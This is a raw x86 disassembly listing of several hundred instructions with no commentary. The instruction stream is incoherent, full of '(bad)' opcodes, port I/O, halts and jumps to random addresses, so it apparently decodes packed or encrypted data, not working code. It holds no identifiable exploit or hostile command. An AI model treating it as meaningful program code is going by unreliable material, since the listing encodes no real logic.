  41c1ac:	mov    cl,BYTE PTR [ecx-0x17]
  41c1af:	mov    ds:0x495438b9,al
  41c1b4:	es push ss
  41c1b6:	scas   al,BYTE PTR es:[edi]
  41c1b7:	out    dx,eax
  41c1b8:	int3   
  41c1b9:	adc    DWORD PTR [ebp-0x5],esp
  41c1bc:	sbb    edi,DWORD PTR [edi+0x7]
  41c1bf:	dec    BYTE PTR [ecx]
  41c1c1:	mov    eax,ds:0x25117e84
  41c1c6:	out    dx,al
  41c1c7:	mov    ah,0x47
  41c1c9:	sahf   
  41c1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1cb:	icebp  
  41c1cc:	in     al,0xda
  41c1ce:	inc    esi
  41c1cf:	fdiv   QWORD PTR ds:[ebx]
  41c1d2:	loop   0x41c1f7
  41c1d4:	test   al,0xa6
  41c1d6:	mov    dh,0x9a
  41c1d8:	sbb    al,dl
  41c1da:	dec    ebp
  41c1db:	mov    WORD PTR [esi],gs
  41c1dd:	cmp    cl,dh
  41c1df:	xor    al,0xbc
  41c1e1:	lahf   
  41c1e2:	mov    esi,0xaa2bf737
  41c1e7:	mov    ds:0x4fad5b80,eax
  41c1ec:	les    ebp,FWORD PTR [ecx+0x30]
  41c1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f0:	xchg   ebp,eax
  41c1f1:	mov    ds:0xb9df2189,al
  41c1f6:	jb     0x41c1b1
  41c1f8:	sub    ah,BYTE PTR [ebp-0x3436f1ae]
  41c1fe:	or     eax,0x17bbed80
  41c203:	inc    edi
  41c204:	hlt    
  41c205:	ficom  DWORD PTR fs:[edx]
  41c208:	fdiv   DWORD PTR [ebp+0x3a2aef48]
  41c20e:	sbb    BYTE PTR [ebx],al
  41c210:	and    bl,BYTE PTR [eax+eiz*1]
  41c213:	fs pop ss
  41c215:	daa    
  41c216:	sbb    BYTE PTR [ebx],al
  41c218:	lahf   
  41c219:	pop    ebx
  41c21a:	mov    esp,0x9edc63a3
  41c21f:	adc    eax,0xcd814f70
  41c224:	and    eax,0xf6974b28
  41c229:	cs jo  0x41c23a
  41c22c:	bswap  ebp
  41c22e:	shl    DWORD PTR [edi+0xc],cl
  41c231:	aad    0x3e
  41c233:	and    DWORD PTR [edx],edi
  41c235:	pop    edi
  41c236:	in     al,dx
  41c237:	mov    DWORD PTR [ebp+0x584f302d],eax
  41c23d:	mov    ch,0x32
  41c23f:	sbb    eax,0x3e93a18f
  41c244:	mov    ah,0xde
  41c246:	adc    DWORD PTR [ecx-0x13a7699e],esi
  41c24c:	jmp    DWORD PTR [ecx]
  41c24e:	xor    ch,0xe2
  41c251:	jg     0x41c229
  41c253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c254:	push   ebx
  41c255:	fld    DWORD PTR [ebx]
  41c257:	xchg   ebx,eax
  41c258:	cmp    ch,BYTE PTR [edi]
  41c25a:	imul   edx,DWORD PTR [edx-0x38d6c06b],0xb8558bae
  41c264:	mov    ebx,0xae2221bb
  41c269:	aas    
  41c26a:	pop    ebp
  41c26b:	dec    edx
  41c26c:	aas    
  41c26d:	test   edx,ecx
  41c26f:	and    al,0x1d
  41c271:	sub    eax,0xcda88a96
  41c276:	sbb    esi,DWORD PTR [ebx+edx*2+0x7d9e7ea8]
  41c27d:	fcom   QWORD PTR [ebx]
  41c27f:	fcmovnb st,st(4)
  41c281:	jmp    0x41c2f4
  41c283:	or     DWORD PTR [eax-0x3b820e41],0x9e09cf
  41c28d:	pop    edi
  41c28e:	cdq    
  41c28f:	and    BYTE PTR [ebp-0x555daa8b],bl
  41c295:	and    eax,0x79a30164
  41c29a:	xchg   edx,eax
  41c29b:	push   es
  41c29c:	sub    DWORD PTR [edx+0x3d5cf444],esi
  41c2a2:	out    0x61,al
  41c2a4:	sub    eax,DWORD PTR [eax]
  41c2a6:	ret    0x906a
  41c2a9:	shr    BYTE PTR [ebp-0x2b5734],cl
  41c2af:	jp     0x41c25c
  41c2b1:	icebp  
  41c2b2:	shl    BYTE PTR [ecx+0x17],cl
  41c2b5:	sub    DWORD PTR [ecx+eax*2-0x7a],edi
  41c2b9:	adc    BYTE PTR [ecx+esi*1+0x0],dl
  41c2bd:	xor    DWORD PTR [esi-0x5d],0xf3a41859
  41c2c4:	inc    ecx
  41c2c5:	jno    0x41c2aa
  41c2c7:	(bad)  
  41c2c8:	iret   
  41c2c9:	int    0x62
  41c2cb:	adc    al,0x79
  41c2cd:	jno    0x41c348
  41c2cf:	mov    ch,0xce
  41c2d1:	idiv   cl
  41c2d3:	mov    ecx,0x1dc9d6a
  41c2d8:	(bad)  
  41c2d9:	cwde   
  41c2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2db:	fsub   DWORD PTR [ecx-0x20]
  41c2de:	sub    eax,0x9eb52096
  41c2e3:	push   es
  41c2e4:	jns    0x41c34f
  41c2e6:	add    al,ah
  41c2e8:	mov    cl,0x71
  41c2ea:	(bad)  
  41c2eb:	outs   dx,BYTE PTR ds:[esi]
  41c2ec:	test   eax,edi
  41c2ee:	pop    ecx
  41c2ef:	or     cl,al
  41c2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f2:	pop    ebp
  41c2f3:	out    0xfc,eax
  41c2f5:	xchg   ebp,eax
  41c2f6:	mov    bh,0x77
  41c2f8:	imul   ebp,edi,0x44e9f530
  41c2fe:	loopne 0x41c2e3
  41c300:	cli    
  41c301:	xor    al,0xbf
  41c303:	outs   dx,DWORD PTR ds:[esi]
  41c304:	jne    0x41c302
  41c306:	test   DWORD PTR [esi+edx*1-0x5706f015],esp
  41c30d:	hlt    
  41c30e:	push   ds
  41c30f:	mov    ds:0x4cc6484c,al
  41c314:	push   ebp
  41c315:	add    dh,BYTE PTR [ebx-0x160a7689]
  41c31b:	mov    al,bl
  41c31d:	jg     0x41c336
  41c31f:	sahf   
  41c320:	add    BYTE PTR [eax-0x453962f2],al
  41c326:	lahf   
  41c327:	inc    esi
  41c328:	mov    esi,0x71396232
  41c32d:	retf   0x20e9
  41c330:	adc    DWORD PTR [edi-0x2b],ebp
  41c333:	sub    al,0xc3
  41c335:	inc    eax
  41c336:	sub    DWORD PTR [eax+0x51],ebx
  41c339:	not    dl
  41c33b:	mov    ebp,0x994b5517
  41c340:	ins    DWORD PTR es:[edi],dx
  41c341:	xor    bl,BYTE PTR [ebp+0x77]
  41c344:	data16 sub BYTE PTR [esi+0x6658ced],dh
  41c34b:	outs   dx,BYTE PTR ds:[esi]
  41c34c:	jns    0x41c3be
  41c34e:	loope  0x41c2f7
  41c350:	mov    ch,0xab
  41c352:	or     DWORD PTR [esp+eiz*2-0x2975a0be],0x5dc99429
  41c35d:	mov    DWORD PTR [ebp+0x1e],ebx
  41c360:	push   eax
  41c361:	or     BYTE PTR [ebx],bl
  41c363:	bound  esp,QWORD PTR [esi-0x4d3e2eb8]
  41c369:	xor    BYTE PTR [ebx-0x61f21f17],ah
  41c36f:	jp     0x41c3d9
  41c371:	mov    bl,0xe4
  41c373:	out    0x29,al
  41c375:	jl     0x41c365
  41c377:	add    DWORD PTR [edi-0x2f78c968],0x84e68864
  41c381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c382:	pop    ebx
  41c383:	bound  edx,QWORD PTR [esp+eax*4+0x20]
  41c387:	mov    ah,0x8b
  41c389:	mov    ah,BYTE PTR [edx+ecx*1-0x26]
  41c38d:	and    eax,0xe6a2d6cc
  41c392:	inc    esi
  41c393:	add    eax,0x13ec29b6
  41c398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c399:	scas   eax,DWORD PTR es:[edi]
  41c39a:	and    eax,0xa793cc7f
  41c39f:	sub    DWORD PTR [eax+0x25a03ba7],0x207bfcd0
  41c3a9:	ret    
  41c3aa:	cli    
  41c3ab:	or     al,0x57
  41c3ad:	jmp    0x41c3f4
  41c3af:	stos   BYTE PTR es:[edi],al
  41c3b0:	and    edi,DWORD PTR [edx+0x17e508d0]
  41c3b6:	push   ebx
  41c3b7:	xchg   ecx,eax
  41c3b8:	mov    al,BYTE PTR [ebx]
  41c3ba:	scas   eax,DWORD PTR es:[edi]
  41c3bb:	call   0xfb8bbc0b
  41c3c0:	enter  0x92f0,0x22
  41c3c4:	push   edx
  41c3c5:	xor    al,0x66
  41c3c7:	dec    esp
  41c3c8:	jno    0x41c3fc
  41c3ca:	jno    0x41c388
  41c3cc:	cmp    al,BYTE PTR [esp+ebp*4+0x2]
  41c3d0:	mov    edi,0xf656b9ba
  41c3d5:	mov    al,ds:0x32a7dc4a
  41c3da:	jbe    0x41c362
  41c3dc:	xchg   esi,eax
  41c3dd:	mov    esi,ebx
  41c3df:	xchg   BYTE PTR [ebp+0x26],bh
  41c3e2:	pop    edx
  41c3e3:	inc    eax
  41c3e4:	mov    eax,ds:0xc6732c1e
  41c3e9:	xor    eax,0xcbaf2a2
  41c3ee:	push   edx
  41c3ef:	(bad)  
  41c3f1:	mov    es,WORD PTR [edi-0x5d9a6ef3]
  41c3f7:	mov    bh,0xf8
  41c3f9:	mov    ecx,0x346a6a2c
  41c3fe:	rcr    ebx,1
  41c400:	into   
  41c401:	int3   
  41c402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c403:	das    
  41c404:	and    al,0x96
  41c406:	rcr    BYTE PTR [eax],cl
  41c408:	xchg   esi,eax
  41c409:	aas    
  41c40a:	inc    ecx
  41c40b:	rcl    DWORD PTR [ecx+0x31],cl
  41c40e:	inc    ebx
  41c40f:	dec    ecx
  41c410:	maskmovq mm3,(bad)
  41c411:	neg    DWORD PTR [ecx+eax*8-0x3702e1ee]
  41c418:	push   edi
  41c419:	fnstenv [ecx]
  41c41b:	xor    al,0xe7
  41c41d:	in     al,0x75
  41c41f:	mov    esp,0x6b8cd00a
  41c424:	leave  
  41c425:	les    ebx,FWORD PTR [esi]
  41c427:	ror    DWORD PTR [esi],0x69
  41c42a:	sbb    DWORD PTR ds:0x300f00f3,ecx
  41c430:	call   0x9f62b409
  41c435:	retf   0xc3a0
  41c438:	repz (bad) 
  41c43a:	mov    WORD PTR [esi-0x1f],cs
  41c43d:	pop    ss
  41c43e:	out    0x3,al
  41c440:	jecxz  0x41c471
  41c442:	push   ecx
  41c443:	aas    
  41c444:	ror    DWORD PTR [edi-0x79],0xbe
  41c448:	mov    al,ds:0x1f2c9359
  41c44d:	fadd   DWORD PTR [ebp-0x10773a59]
  41c453:	stos   BYTE PTR es:[edi],al
  41c454:	cmp    eax,0x20f26f89
  41c459:	int    0xd6
  41c45b:	and    al,ah
  41c45d:	div    BYTE PTR [esi]
  41c45f:	or     DWORD PTR [esp+ecx*4],0x7fb9626f
  41c466:	leave  
  41c467:	nop
  41c468:	pop    ebp
  41c469:	ins    BYTE PTR es:[edi],dx
  41c46a:	add    ecx,DWORD PTR [eax]
  41c46c:	cdq    
  41c46d:	das    
  41c46e:	dec    eax
  41c46f:	not    BYTE PTR [eax-0x55]
  41c472:	arpl   dx,ax
  41c474:	pop    edi
  41c475:	sbb    BYTE PTR [edx-0x6f],ch
  41c478:	xor    BYTE PTR [edx-0x34ab64b],al
  41c47e:	sub    ch,BYTE PTR ds:0x988f1661
  41c484:	adc    eax,0xd9a80b76
  41c489:	loop   0x41c461
  41c48b:	mov    cl,0x71
  41c48d:	mov    edx,DWORD PTR [esp+ecx*4+0x7d]
  41c491:	and    al,0x8d
  41c493:	fwait
  41c494:	das    
  41c495:	popf   
  41c496:	pop    ebx
  41c497:	xlat   BYTE PTR ds:[ebx]
  41c498:	dec    esi
  41c499:	xchg   edx,eax
  41c49a:	outs   dx,BYTE PTR ds:[esi]
  41c49b:	sub    ch,dl
  41c49d:	jle    0x41c509
  41c49f:	scas   al,BYTE PTR es:[edi]
  41c4a0:	or     BYTE PTR [ebp-0x6fe6c8b0],bl
  41c4a6:	test   DWORD PTR ds:0x9ae43c07,ebx
  41c4ac:	fnsave [esp+ecx*4]
  41c4af:	(bad)  
  41c4b0:	cdq    
  41c4b1:	jb     0x41c43b
  41c4b3:	ds mov esp,0x3f11c2a2
  41c4b9:	pusha  
  41c4ba:	enter  0x5087,0x78
  41c4be:	sub    cl,BYTE PTR [edi]
  41c4c0:	(bad)  
  41c4c1:	repnz inc edx
  41c4c3:	int    0x84
  41c4c5:	in     eax,dx
  41c4c6:	mov    ch,0xcb
  41c4c8:	lahf   
  41c4c9:	pop    ds
  41c4ca:	sbb    cl,BYTE PTR [ecx+0x144cdd54]
  41c4d0:	pop    esi
  41c4d1:	mov    ebx,0xb71e52fb
  41c4d6:	or     DWORD PTR [esi-0x41],ecx
  41c4d9:	mov    edi,0x59cd940a
  41c4de:	int3   
  41c4df:	xchg   ebx,eax
  41c4e0:	hlt    
  41c4e1:	push   esi
  41c4e2:	jmp    0xf9b270d8
  41c4e7:	push   edx
  41c4e8:	add    BYTE PTR [edi-0x1e],0x9
  41c4ec:	lods   eax,DWORD PTR ds:[esi]
  41c4ed:	retf   
  41c4ee:	adc    bh,BYTE PTR [ebx-0x13]
  41c4f1:	aaa    
  41c4f2:	jecxz  0x41c4ac
  41c4f4:	add    al,0x7a
  41c4f6:	test   eax,0x5be1b24f
  41c4fb:	not    BYTE PTR [edi]
  41c4fd:	ror    BYTE PTR [ebp+0x27],0xe
  41c501:	jp     0x41c4fc
  41c503:	test   al,0xc0
  41c505:	or     eax,0xa17a8f1e
  41c50a:	jp     0x41c546
  41c50c:	mov    ebx,0xe69c06e7
  41c511:	in     eax,dx
  41c512:	retf   
  41c513:	push   ebp
  41c514:	repnz sub eax,DWORD PTR [ecx-0x15]
  41c518:	pop    edi
  41c519:	int3   
  41c51a:	cli    
  41c51b:	sbb    al,0xbb
  41c51d:	xchg   ecx,eax
  41c51e:	mov    dh,0x2a
  41c520:	xchg   ebp,eax
  41c521:	mov    cl,0x42
  41c523:	iret   
  41c524:	xor    eax,0xcdc07b1b
  41c529:	push   edx
  41c52a:	rol    DWORD PTR [edi+0x772157a3],0x99
  41c531:	cmp    al,BYTE PTR [edx-0x6fdd7e96]
  41c537:	jbe    0x41c50b
  41c539:	inc    edi
  41c53a:	bnd ret 0xf55f
  41c53e:	cdq    
  41c53f:	xchg   esi,eax
  41c540:	and    eax,0xb71153ea
  41c545:	add    dh,BYTE PTR [ebx]
  41c547:	rol    DWORD PTR [edx-0x2fffe3a9],0xd5
  41c54e:	mov    cl,0x1a
  41c550:	cmp    BYTE PTR [esp+esi*2],dh
  41c553:	cmp    DWORD PTR ds:0x16e04c74,ecx
  41c559:	push   ecx
  41c55a:	ins    DWORD PTR es:[edi],dx
  41c55b:	popa   
  41c55c:	push   edx
  41c55d:	int    0x45
  41c55f:	mov    es,WORD PTR [ebx]
  41c561:	fadd   st,st(1)
  41c563:	sub    BYTE PTR [ebp+0xf],cl
  41c566:	fcmovbe st,st(2)
  41c568:	bound  ebx,QWORD PTR [ebx+ecx*8]
  41c56b:	jmp    DWORD PTR [eax+0x3e5ebaa2]
  41c571:	cmc    
  41c572:	push   edx
  41c573:	mov    edx,DWORD PTR [edi-0x7594137d]
  41c579:	int    0xf1
  41c57b:	push   ebp
  41c57c:	(bad)  
  41c57d:	out    dx,al
  41c57e:	lds    esp,FWORD PTR [ebp-0x33]
  41c581:	and    ebp,0x79
  41c584:	into   
  41c585:	adc    BYTE PTR [edi+ebp*8+0x2fbdc6de],bh
  41c58c:	adc    al,0x8b
  41c58e:	push   es
  41c58f:	arpl   WORD PTR [edi+edx*1+0x1c8aeb0e],di
  41c596:	pop    ecx
  41c597:	repnz cmc 
  41c599:	add    edx,ebx
  41c59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c59d:	mov    ah,0x11
  41c59f:	fbld   TBYTE PTR [esi-0x10]
  41c5a2:	ret    
  41c5a3:	xchg   edi,eax
  41c5a4:	or     al,0xd1
  41c5a6:	mov    dh,0x16
  41c5a8:	sbb    BYTE PTR [eax],bl
  41c5aa:	shl    BYTE PTR [eax+0x33],cl
  41c5ad:	mov    WORD PTR [eax+ebp*8+0x664b37a3],ds
  41c5b4:	ss sbb ah,bh
  41c5b7:	inc    ebx
  41c5b8:	leave  
  41c5b9:	neg    BYTE PTR [ebp+0x39]
  41c5bc:	sub    BYTE PTR [ebp+0x587eaea2],ch
  41c5c2:	sub    al,BYTE PTR [edi]
  41c5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5c5:	lahf   
  41c5c6:	aas    
  41c5c7:	out    dx,eax
  41c5c8:	pop    eax
  41c5c9:	pushf  
  41c5ca:	outs   dx,DWORD PTR ds:[esi]
  41c5cb:	adc    DWORD PTR [esi],esi
  41c5cd:	push   0xffffffb3
  41c5cf:	out    dx,eax
  41c5d0:	add    al,0x72
  41c5d2:	rcl    DWORD PTR [edi+0x75],0x75
  41c5d6:	add    ch,al
  41c5d8:	dec    ebp
  41c5d9:	adc    bl,BYTE PTR [esi]
  41c5db:	inc    ecx
  41c5dc:	into   
  41c5dd:	ret    
  41c5de:	inc    edi
  41c5df:	jb     0x41c5bb
  41c5e1:	and    DWORD PTR [eax+0x68],eax
  41c5e4:	out    dx,eax
  41c5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e6:	icebp  
  41c5e7:	inc    eax
  41c5e8:	retf   0xdf0a
  41c5eb:	xor    eax,0x94fc3b0c
  41c5f0:	sbb    cl,ah
  41c5f2:	jns    0x41c65e
  41c5f4:	stc    
  41c5f5:	ds dec esi
  41c5f7:	(bad)  
  41c5f8:	mov    ecx,0xca1a1ac
  41c5fd:	dec    esi
  41c5fe:	(bad)  
  41c5ff:	jge    0x41c5d8
  41c601:	ds dec ebx
  41c603:	jae    0x41c649
  41c605:	sbb    eax,DWORD PTR [ebx-0x4e]
  41c608:	cld    
  41c609:	pop    esi
  41c60a:	push   ecx
  41c60b:	xor    ah,bl
  41c60d:	addr16 push esp
  41c60f:	mov    edx,0x3a660f7b
  41c614:	(bad)  
  41c615:	cmc    
  41c616:	aas    
  41c617:	mov    al,ds:0x1e422028
  41c61c:	cdq    
  41c61d:	and    al,0x1b
  41c61f:	mov    dh,0xbe
  41c621:	jbe    0x41c65d
  41c623:	shr    BYTE PTR [esi+0x1b],0xd3
  41c627:	aam    0x4b
  41c629:	xchg   esi,eax
  41c62a:	adc    dl,BYTE PTR [eax-0x3e]
  41c62d:	ficomp WORD PTR [eax]
  41c62f:	jae    0x41c612
  41c631:	int    0x1c
  41c633:	pop    edx
  41c634:	fisttp QWORD PTR [edx+0x33c8d6d3]
  41c63a:	pop    eax
  41c63b:	aas    
  41c63c:	sub    DWORD PTR [ecx+edx*4],ecx
  41c63f:	push   0x14
  41c641:	ins    BYTE PTR es:[edi],dx
  41c642:	out    0xc1,al
  41c644:	and    al,0xb
  41c646:	es fwait
  41c648:	out    0x8,al
  41c64a:	aaa    
  41c64b:	sar    BYTE PTR [eax],cl
  41c64d:	inc    esp
  41c64e:	(bad)  
  41c64f:	dec    BYTE PTR [esi+edi*8+0x4eeadfb3]
  41c656:	mov    ebx,DWORD PTR [ebx]
  41c658:	mov    eax,0xd749b8f3
  41c65d:	push   0x5e
  41c65f:	adc    esp,DWORD PTR [esi+0x34583380]
  41c665:	add    eax,0x6c58b919
  41c66a:	gs hlt 
  41c66c:	adc    DWORD PTR [ebx],ebx
  41c66e:	inc    ecx
  41c66f:	(bad)  
  41c670:	mov    esi,0xceded2ed
  41c675:	inc    ebx
  41c676:	dec    edx
  41c677:	pop    esp
  41c678:	leave  
  41c679:	sub    edx,0xd35802f8
  41c67f:	adc    edx,esp
  41c681:	scas   al,BYTE PTR es:[edi]
  41c682:	push   ss
  41c683:	out    dx,al
  41c684:	nop
  41c685:	div    DWORD PTR [edi-0x1a]
  41c688:	daa    
  41c689:	adc    eax,0x4a320d0a
  41c68e:	add    DWORD PTR [esi+edx*8-0x2ccd80cc],ecx
  41c695:	mov    WORD PTR [edx*1+0x230756af],es
  41c69c:	sbb    BYTE PTR [esi+0x4f081bcb],0x86
  41c6a3:	out    dx,al
  41c6a4:	aad    0xea
  41c6a6:	(bad)  
  41c6a7:	mul    DWORD PTR [ebx]
  41c6a9:	cdq    
  41c6aa:	fcomp  DWORD PTR [ebx-0x1d7c5070]
  41c6b0:	cmp    DWORD PTR [eax+0x57],ebp
  41c6b3:	jmp    0xe7b8:0x75421ce9
  41c6ba:	pop    edi
  41c6bb:	mov    ebx,0x4617d859
  41c6c0:	cli    
  41c6c1:	icebp  
  41c6c2:	enter  0x1be9,0x66
  41c6c6:	arpl   ax,sp
  41c6c8:	inc    eax
  41c6c9:	dec    eax
  41c6ca:	out    dx,eax
  41c6cb:	mov    al,BYTE PTR [edx+edi*2]
  41c6ce:	cli    
  41c6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6d0:	or     DWORD PTR [esi],eax
  41c6d2:	fadd   DWORD PTR [eax-0x72]
  41c6d5:	pop    ds
  41c6d6:	xchg   ecx,eax
  41c6d7:	fdivr  DWORD PTR [ebx+0x24]
  41c6da:	jns    0x41c65d
  41c6dc:	jl     0x41c72e
  41c6de:	xor    DWORD PTR [ebp-0x250f37e8],0xc3ae14b3
  41c6e8:	add    eax,0xcdff0aaa
  41c6ed:	cdq    
  41c6ee:	(bad)  [eax+0x29]
  41c6f1:	sar    ah,0x3e
  41c6f4:	retf   
  41c6f5:	sahf   
  41c6f6:	into   
  41c6f7:	ficom  DWORD PTR [ebp+0x57cc2ae3]
  41c6fd:	add    eax,0xf5ae2a2f
  41c702:	(bad)  
  41c703:	xor    DWORD PTR [edi-0x6f],edx
  41c706:	mov    ebp,0x9981f6a7
  41c70b:	retf   0x475f
  41c70e:	imul   ebx,DWORD PTR [edi+0x5],0xcf60604
  41c715:	inc    esi
  41c716:	popa   
  41c717:	(bad)  
  41c718:	out    0x1a,eax
  41c71a:	retf   0xd774
  41c71d:	add    BYTE PTR [edx+ebx*1],ah
  41c720:	xchg   ebx,edi
  41c722:	cwde   
  41c723:	loopne 0x41c74b
  41c725:	jo     0x41c762
  41c727:	aas    
  41c728:	pushf  
  41c729:	test   eax,0x63e6f7a1
  41c72e:	lahf   
  41c72f:	cmc    
  41c730:	lds    ebp,FWORD PTR [edx+0x4077b821]
  41c736:	pause  
  41c738:	mov    ch,0xc9
  41c73a:	add    ecx,DWORD PTR [edx+0x2beef48e]
  41c740:	push   ecx
  41c741:	mul    DWORD PTR [ebp-0x2785e1cc]
  41c747:	push   eax
  41c748:	jmp    0xdf6:0xe61f5900
  41c74f:	stos   DWORD PTR es:[edi],eax
  41c750:	daa    
  41c751:	stc    
  41c752:	or     ch,BYTE PTR [ebx-0x11ceef6]
  41c758:	ret    
  41c759:	adc    al,0x2d
  41c75b:	fbstp  TBYTE PTR [ebp-0xb968863]
  41c761:	jg     0x41c784
  41c763:	aaa    
  41c764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c765:	bts    DWORD PTR [esi-0x2adbc4ce],esi
  41c76c:	das    
  41c76d:	cmp    ebx,DWORD PTR [ebx-0x2fa73762]
  41c773:	adc    esp,DWORD PTR [ebx]
  41c775:	mov    esi,0x4f736847
  41c77a:	inc    eax
  41c77b:	or     DWORD PTR [edi+0x71],0xffffffd9
  41c77f:	pop    edi
  41c780:	adc    al,BYTE PTR [edx]
  41c782:	ins    DWORD PTR es:[edi],dx
  41c783:	aas    
  41c784:	aaa    
  41c785:	and    al,0x9
  41c787:	aam    0x4a
  41c789:	cmp    al,0x79
  41c78b:	ja     0x41c78d
  41c78d:	faddp  st(7),st
  41c78f:	add    dh,dl
  41c791:	aaa    
  41c792:	push   edi
  41c793:	daa    
  41c794:	dec    esp
  41c795:	mov    esi,0xdc2ecc1f
  41c79a:	stos   DWORD PTR es:[edi],eax
  41c79b:	cmp    eax,eax
  41c79d:	inc    esp
  41c79e:	rol    DWORD PTR [edi],1
  41c7a0:	ret    0xeb56
  41c7a3:	adc    cl,BYTE PTR [eax+0x2b]
  41c7a6:	std    
  41c7a7:	fcomi  st,st(7)
  41c7a9:	out    dx,al
  41c7aa:	sub    eax,DWORD PTR [edi-0x29]
  41c7ad:	inc    ebx
  41c7ae:	ret    
  41c7af:	aad    0x2d
  41c7b1:	jne    0x41c800
  41c7b3:	inc    edi
  41c7b4:	dec    esi
  41c7b5:	stc    
  41c7b6:	mov    cl,0xc2
  41c7b8:	sti    
  41c7b9:	nop
  41c7ba:	cmc    
  41c7bb:	cmovg  ebp,ebp
  41c7be:	(bad)  
  41c7bf:	dec    DWORD PTR [ecx+ebp*1+0x4a21875]
  41c7c6:	out    dx,eax
  41c7c7:	fwait
  41c7c8:	sbb    DWORD PTR [edi+0x4631b01a],edi
  41c7ce:	popf   
  41c7cf:	pop    eax
  41c7d0:	dec    ebp
  41c7d1:	adc    esp,DWORD PTR [ebp+0x38b41cc0]
  41c7d7:	call   0xf03e73cb
  41c7dc:	pop    esi
  41c7dd:	push   0x13
  41c7df:	add    DWORD PTR [ecx],ecx
  41c7e1:	test   DWORD PTR [edx],esp
  41c7e3:	aas    
  41c7e4:	out    dx,eax
  41c7e5:	fldenv [ebx-0x62fc52f4]
  41c7eb:	inc    DWORD PTR [ecx+0x18d36234]
  41c7f1:	in     eax,dx
  41c7f2:	stos   BYTE PTR es:[edi],al
  41c7f3:	int3   
  41c7f4:	lea    eax,[ebx]
  41c7f6:	mov    edx,0x5e3ddbe3
  41c7fb:	inc    ecx
  41c7fc:	push   cs
  41c7fd:	pop    esi
  41c7fe:	and    ecx,DWORD PTR [esi+0x7fdf2b10]
  41c804:	sbb    dl,bl
  41c806:	ins    DWORD PTR es:[edi],dx
  41c807:	mov    edi,0x3f684578
  41c80c:	and    ecx,DWORD PTR [ebp-0x17]
  41c80f:	fmul   QWORD PTR [edi+0x78]
  41c812:	popa   
  41c813:	cmc    
  41c814:	call   0x849bd827
  41c819:	cwde   
  41c81a:	test   DWORD PTR [ebx],ebp
  41c81c:	xchg   ecx,eax
  41c81d:	mov    eax,ds:0xed3e49a5
  41c822:	jne    0x41c7a6
  41c824:	test   eax,0xe8704b1c
  41c829:	rol    DWORD PTR [ebx+0x35fda18d],1
  41c82f:	push   es
  41c830:	out    0x1b,ax
  41c833:	mov    dh,0x36
  41c835:	push   esp
  41c836:	(bad)  
  41c837:	or     eax,ebp
  41c839:	cs cdq 
  41c83b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c83c:	(bad)  [ebx-0x119c4293]
  41c842:	xchg   ebx,eax
  41c843:	adc    al,0x39
  41c845:	test   DWORD PTR [edx],ebx
  41c847:	in     eax,0xac
  41c849:	dec    BYTE PTR [ebx+0x49b79ef3]
  41c84f:	xchg   ebx,eax
  41c850:	mov    edx,0xcba9e1bc
  41c855:	push   esp
  41c856:	cmp    DWORD PTR [esp+edx*2-0x31],edx
  41c85a:	or     DWORD PTR [eax],0xe500d88c
  41c860:	fldcw  WORD PTR [esi+0x7f]
  41c863:	cmc    
  41c864:	dec    ebp
  41c865:	std    
  41c866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c867:	jno    0x41c85e
  41c869:	aas    
  41c86a:	xchg   edx,eax
  41c86b:	mov    dh,ah
  41c86d:	ret    
  41c86e:	ret    
  41c86f:	jp     0x41c7f3
  41c871:	push   0xb081ccd3
  41c876:	sub    eax,0xf642812c
  41c87b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c87c:	cmp    eax,0x7c8cc72e
  41c881:	inc    esp
  41c882:	adc    DWORD PTR [ebx+ebx*8],ebp
  41c885:	pop    edx
  41c886:	push   ebp
  41c887:	mov    BYTE PTR [edx-0x5876fe6c],bh
  41c88d:	(bad)  
  41c88e:	mov    eax,0x73a30355
  41c893:	jp     0x41c8aa
  41c895:	push   ecx
  41c896:	addr16 jle 0x41c8c9
  41c899:	xchg   BYTE PTR [edx-0xe6b41ab],bh
  41c89f:	cwde   
  41c8a0:	mov    ebp,0x1306f7c1
  41c8a5:	nop
  41c8a6:	add    eax,0xe9e3a846
  41c8ab:	dec    edi
  41c8ac:	arpl   WORD PTR [edx+0x24],ax
  41c8af:	add    eax,0xa339c8cf
  41c8b4:	xchg   ebp,eax
  41c8b5:	jns    0x41c92e
  41c8b7:	test   al,0xa9
  41c8b9:	dec    esp
  41c8ba:	cmp    cl,bh
  41c8bc:	lods   eax,DWORD PTR ds:[esi]
  41c8bd:	adc    DWORD PTR ds:0x33d79c42,esp
  41c8c3:	pop    ecx
  41c8c4:	aad    0xd4
  41c8c6:	pop    esi
  41c8c7:	dec    esi
  41c8c8:	(bad)  
  41c8c9:	popa   
  41c8ca:	repz add cl,bh
  41c8cd:	stos   BYTE PTR es:[edi],al
  41c8ce:	lea    ebx,[edx-0x41]
  41c8d1:	in     al,0xd3
  41c8d3:	fdiv   DWORD PTR [ecx-0x2bc166e4]
  41c8d9:	inc    ecx
  41c8da:	lods   al,BYTE PTR ds:[esi]
  41c8db:	pop    edx
  41c8dc:	cmp    BYTE PTR [edx+0x3],ah
  41c8df:	out    0x86,al
  41c8e1:	pusha  
  41c8e2:	aaa    
  41c8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8e4:	push   ebp
  41c8e5:	dec    esi
  41c8e6:	test   DWORD PTR [eax+eiz*8-0x7a501a9d],esi
  41c8ed:	sahf   
  41c8ee:	push   edx
  41c8ef:	in     al,dx
  41c8f0:	hlt    
  41c8f1:	jmp    0x41c912
  41c8f3:	loope  0x41c94a
  41c8f5:	adc    ebx,DWORD PTR [ebp-0x6d]
